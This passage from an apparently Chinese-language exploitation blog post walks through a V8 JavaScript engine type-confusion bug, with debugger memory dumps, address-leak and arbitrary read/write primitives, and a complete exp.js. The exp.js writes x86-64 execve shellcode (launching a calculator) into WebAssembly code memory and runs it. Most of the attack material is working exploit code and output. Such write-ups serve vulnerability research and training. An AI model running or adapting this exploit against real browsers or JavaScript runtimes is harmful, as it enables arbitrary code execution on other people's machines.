class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">//伪造后的dic,0xxx64b1为victim对象地址</span><br><span class="line">DebugPrint: 0x1e35ef8022c9: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x3446f238ca21 [FastProperties]</span><br><span class="line"> - prototype = 0x8f9bd9846a9</span><br><span class="line"> - elements = 0x10dc9ba82251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x263969b926b1 &lt;PropertyArray[3]&gt; &#123;</span><br><span class="line">    <span class="comment">#a: 1 (data field 0)</span></span><br><span class="line">    <span class="comment">#b: 0x1ef2e2e064b1 &lt;Object map = 0x3446f238c841&gt; (data field 1) properties[0]</span></span><br><span class="line"> &#125;</span><br><span class="line">//victim对象地址，注意此时的properties已经改为了ArrayBuffer的地址0xxx6461</span><br><span class="line">DebugPrint: 0x1ef2e2e064b1: [JS_OBJECT_TYPE] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map = 0x3446f238c841 [FastProperties]</span><br><span class="line"> - prototype = 0x8f9bd9846a9</span><br><span class="line"> - elements = 0x10dc9ba82251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x1ef2e2e06461 &lt;ArrayBuffer map = 0x3446f2382f71&gt; &#123;</span><br><span class="line">    <span class="comment">#inline: 42 (data field 0)</span></span><br><span class="line">    <span class="comment">#offset0: 0x10dc9ba82251 &lt;FixedArray[0]&gt; (data field 1) properties[0]</span></span><br><span class="line">    <span class="comment">#offset8: 200 (data field 2) properties[1]</span></span><br><span class="line">    <span class="comment">#offset16: 21917 (data field 3) properties[2]</span></span><br><span class="line"> &#125;</span><br><span class="line">//ArrayBuffer对象</span><br><span class="line">DebugPrint: 0x1ef2e2e06461: [JSArrayBuffer] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map = 0x3446f2382f71 [FastProperties]</span><br><span class="line"> - prototype = 0x8f9bd98b7b9</span><br><span class="line"> - elements = 0x10dc9ba82251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store = 0x559d0141c4a0</span><br><span class="line"> - byte_length = 200</span><br><span class="line"> - neuterable</span><br><span class="line"> - properties = 0x10dc9ba82251 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    (nil)</span><br><span class="line">    (nil)</span><br><span class="line"> &#125;</span><br><span class="line">//</span><br><span class="line">gdb-peda$ telescope 0x1ef2e2e06461-1</span><br><span class="line">0000| 0x1ef2e2e06460 --&gt; 0x3446f2382f71 --&gt; 0xa000033ff993822 </span><br><span class="line">0008| 0x1ef2e2e06468 --&gt; 0x10dc9ba82251 --&gt; 0x33ff993822 </span><br><span class="line">0016| 0x1ef2e2e06470 --&gt; 0x10dc9ba82251 --&gt; 0x33ff993822 (offset0)</span><br><span class="line">0024| 0x1ef2e2e06478 --&gt; 0xc800000000 (offset8)</span><br><span class="line">0032| 0x1ef2e2e06480 --&gt; 0x559d0141c4a0 --&gt; 0x0 (offset16)</span><br></pre></td></tr></table></figure>
+<h3 id="arbRead-arbWrite原语"><a href="#arbRead-arbWrite原语" class="headerlink" title="arbRead/arbWrite原语"></a>arbRead/arbWrite原语</h3><p>在前面伪造<code>properties</code>的基础上，我们修改<code>data_buf-&gt;backing_store</code>指向另一个ArrayBuffer，<code>victim.offset16 = view_buf</code>，当我们使用<code>var data_view = new DataView(data_buf);data_view.setFloat64(31,addr,true)</code>时，实际上是对<code>view_buf+0x20</code>处赋值<code>addr</code>，而这个位置恰好对应<code>view_buf-&gt;backing_store</code>，因此再调用<code>view_view = new DataView(view_buf);view_view.getFloat64(0,true)</code>时读取的对象为<code>addr</code>处的值。同理也可使用<code>setUint8</code>向该地址处写值。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data_buf_addr = addressOf(data_buf);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]data_buf addr : "</span> + hex(data_buf_addr));</span><br><span class="line"></span><br><span class="line">fakeProperties(victim,i2f(data_buf_addr+<span class="number">1</span>));</span><br><span class="line"><span class="comment">//--------------------------------------------</span></span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> view_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">200</span>);</span><br><span class="line"><span class="comment">//victim.offset16 = i2f(addressOf(view_buf));</span></span><br><span class="line">victim.offset16 = view_buf;</span><br><span class="line"><span class="comment">// %DebugPrint(data_buf);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbRead</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//view_buf+0x20 -&gt; view_buf.backing_store = addr</span></span><br><span class="line">  data_view.setFloat64(<span class="number">31</span>,i2f(addr),<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> view_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(view_buf);</span><br><span class="line">  <span class="keyword">return</span> f2i(view_view.getFloat64(<span class="number">0</span>,<span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ardWrite</span>(<span class="params">addr,payload</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//view_buf+0x20 -&gt; view_buf.backing_store = addr</span></span><br><span class="line">  data_view.setFloat64(<span class="number">31</span>,i2f(addr),<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> view_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(view_buf);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; payload.length; i++)&#123;</span><br><span class="line">    view_view.setUint8(i,payload[i],<span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="leak-wasm-code"><a href="#leak-wasm-code" class="headerlink" title="leak wasm code"></a>leak wasm code</h3><p>我们将<code>wasm_function</code>对象作为一个新的成员加入到<code>data_buf</code>中，再通过任意地址写依次读取<code>data_buf_maps-&gt;maps_instance-&gt;instance_wasm_function</code>，得到该对象地址后再获取<code>shared_info_addr-&gt;code_addr-&gt;wasm_code_addr</code>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOfWasmObj</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  data_buf.leak_obj = obj;</span><br><span class="line">  <span class="keyword">var</span> map_addr = arbRead(data_buf_addr)<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">var</span> instance_addr = arbRead(map_addr+<span class="number">0x30</span>)<span class="number">-1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> wasm_addr = arbRead(instance_addr+<span class="number">0x30</span>)<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> wasm_addr;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">var</span> f_addr = addressOfWasmObj(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]f addr : "</span> + hex(f_addr));</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = arbRead(f_addr+<span class="number">0x20</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]shared info addr : "</span> + hex(shared_info_addr));</span><br><span class="line"><span class="keyword">var</span> code_addr = arbRead(shared_info_addr+<span class="number">8</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]code addr : "</span> + hex(code_addr));</span><br><span class="line"><span class="keyword">var</span> wasm_code_addr = code_addr+(<span class="number">0x100</span><span class="number">-0xa0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]wasm code addr : "</span> + hex(wasm_code_addr));</span><br></pre></td></tr></table></figure>
+<h3 id="exp-js"><a href="#exp-js" class="headerlink" title="exp.js"></a>exp.js</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ((<span class="number">1024</span>*<span class="number">1024</span>));i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf8 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf8);</span><br><span class="line"><span class="keyword">var</span> u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf8);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">u</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> r = [];</span><br><span class="line">  r[<span class="number">0</span>] = <span class="built_in">parseInt</span>(u % <span class="number">0x100000000</span>);</span><br><span class="line">  r[<span class="number">1</span>] = <span class="built_in">parseInt</span>((u - r[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">  u32.set(r);</span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line">  f64[<span class="number">0</span>] = d;</span><br><span class="line">  <span class="keyword">let</span> r = <span class="built_in">Array</span>.from(u32);</span><br><span class="line">  <span class="keyword">return</span> r[<span class="number">1</span>]*<span class="number">0x100000000</span> + r[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>,<span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a dataview</span></span><br><span class="line"><span class="comment">//var buf = new ArrayBuffer(0x8);</span></span><br><span class="line"><span class="comment">//var dv = new DataView(buf);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// const getMethods = (obj) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//   let properties = new Set()</span></span><br><span class="line"><span class="comment">//   let currentObj = obj</span></span><br><span class="line"><span class="comment">//   do &#123;</span></span><br><span class="line"><span class="comment">//     Object.getOwnPropertyNames(currentObj).map(item =&gt; properties.add(item))</span></span><br><span class="line"><span class="comment">//   &#125; while ((currentObj = Object.getPrototypeOf(currentObj)))</span></span><br><span class="line"><span class="comment">//   return [...properties.keys()].filter(item =&gt; typeof obj[item] === 'function')</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(getMethods(dv));</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> hh = &#123;<span class="attr">b</span>:<span class="number">13.37</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> x = obj.b;</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> obj.b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    hh.b = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">    foo(hh,()=&gt;<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> addr = f2i(foo(hh,evil))<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeProperties</span>(<span class="params">obj,property</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> dic = &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;;</span><br><span class="line">  dic.b = <span class="number">133.7</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">foo1</span>(<span class="params">obj,callback,val</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> x = obj.b;</span><br><span class="line">    callback();</span><br><span class="line">    obj.b = val;</span><br><span class="line">    <span class="keyword">return</span> obj.b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    dic.b = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">    foo1(dic,()=&gt;<span class="number">1</span>,property);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> addr = f2i(foo1(dic,evil,property))<span class="number">-1</span>;</span><br><span class="line">  <span class="comment">//%DebugPrint(dic);</span></span><br><span class="line">  <span class="comment">//%SystemBreak();</span></span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//--------------------------------------------</span></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">200</span>);</span><br><span class="line"><span class="keyword">var</span> victim = &#123;<span class="attr">inline</span>:<span class="number">42</span>&#125;;</span><br><span class="line">victim.offset0 = &#123;&#125;;</span><br><span class="line">victim.offset8 = &#123;&#125;;</span><br><span class="line">victim.offset16 = &#123;&#125;;</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> data_buf_addr = addressOf(data_buf);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]data_buf addr : "</span> + hex(data_buf_addr));</span><br><span class="line"></span><br><span class="line">fakeProperties(victim,i2f(data_buf_addr+<span class="number">1</span>));</span><br><span class="line"><span class="comment">//--------------------------------------------</span></span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> view_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">200</span>);</span><br><span class="line"><span class="comment">//victim.offset16 = i2f(addressOf(view_buf));</span></span><br><span class="line">victim.offset16 = view_buf;</span><br><span class="line"><span class="comment">// %DebugPrint(data_buf);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbRead</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//view_buf+0x20 -&gt; view_buf.backing_store = addr</span></span><br><span class="line">  data_view.setFloat64(<span class="number">31</span>,i2f(addr),<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> view_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(view_buf);</span><br><span class="line">  <span class="keyword">return</span> f2i(view_view.getFloat64(<span class="number">0</span>,<span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ardWrite</span>(<span class="params">addr,payload</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//view_buf+0x20 -&gt; view_buf.backing_store = addr</span></span><br><span class="line">  data_view.setFloat64(<span class="number">31</span>,i2f(addr),<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> view_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(view_buf);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; payload.length; i++)&#123;</span><br><span class="line">    view_view.setUint8(i,payload[i],<span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//wasm method</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule,&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOfWasmObj</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  data_buf.leak_obj = obj;</span><br><span class="line">  <span class="keyword">var</span> map_addr = arbRead(data_buf_addr)<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">var</span> instance_addr = arbRead(map_addr+<span class="number">0x30</span>)<span class="number">-1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> wasm_addr = arbRead(instance_addr+<span class="number">0x30</span>)<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> wasm_addr;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">var</span> f_addr = addressOfWasmObj(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]f addr : "</span> + hex(f_addr));</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = arbRead(f_addr+<span class="number">0x20</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]shared info addr : "</span> + hex(shared_info_addr));</span><br><span class="line"><span class="keyword">var</span> code_addr = arbRead(shared_info_addr+<span class="number">8</span>)<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]code addr : "</span> + hex(code_addr));</span><br><span class="line"><span class="keyword">var</span> wasm_code_addr = code_addr+(<span class="number">0x100</span><span class="number">-0xa0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]wasm code addr : "</span> + hex(wasm_code_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sc=[<span class="number">0x6a</span>,<span class="number">0x3b</span>,<span class="number">0x58</span>,<span class="number">0x99</span>,<span class="number">0x48</span>,<span class="number">0xbb</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>];</span><br><span class="line"></span><br><span class="line">ardWrite(wasm_code_addr,sc);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这种攻击技巧利用了字典对象中非数字对象的存储位置，我们并非开始就构造<code>obj={a:1,b:1.2}</code>，而是动态添加的方式<code>obj.b=1.337</code>，这使得<code>obj.b</code>第一次在回调函数中被赋值<code>存在类型检查</code>，<code>victim</code>时victim对象地址替代了<code>obj.b</code>的对象地址，第二次<code>obj.b</code>被赋值为<code>fakeProperties</code>时<code>缺失类型检查</code>，<code>obj.b</code>对象依然按照之前的对象存储<code>value</code>的位置进行赋值操作，进而往<code>victim-&gt;properties</code>写入了<code>data_buf_addr</code>。</p>
+<p>对于<code>victim</code>对象来说其<code>victim.offsetx</code>位置由<code>properties</code>决定，<code>properties+0x20</code>处存储的<code>offset16</code>刚好对应<code>data_buf-&gt;backing_store</code>，故可通过修改<code>offset16</code>来修改<code>data_buf-&gt;backing_store</code>指向另一个ArrayBuffer，通过指定偏移<code>31</code>又可以修改后者的<code>backing_store</code>，从而实现任意地址读写。</p>
+<h2 id="fakeArrayBuffer"><a href="#fakeArrayBuffer" class="headerlink" title="fakeArrayBuffer"></a>fakeArrayBuffer</h2><h3 id="leak-ArrayBuffer-prototype-amp-amp-constructor"><a href="#leak-ArrayBuffer-prototype-amp-amp-constructor" class="headerlink" title="leak ArrayBuffer prototype &amp;&amp; constructor"></a>leak ArrayBuffer prototype &amp;&amp; constructor</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab_proto_addr = addressOf(ab.__proto__);</span><br><span class="line"><span class="keyword">var</span> ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="fake-ArrayBuffer-maps"><a href="#fake-ArrayBuffer-maps" class="headerlink" title="fake ArrayBuffer maps"></a>fake ArrayBuffer maps</h3><p>伪造<code>ArrayBuffer</code>的<code>maps</code>如下，因为<code>fake_map=[a,b,c]</code>的形式下<code>obj_addr</code>和<code>elements_addr</code>地址偏移不固定，所以参考姚老板的trick用字典对象。</p>
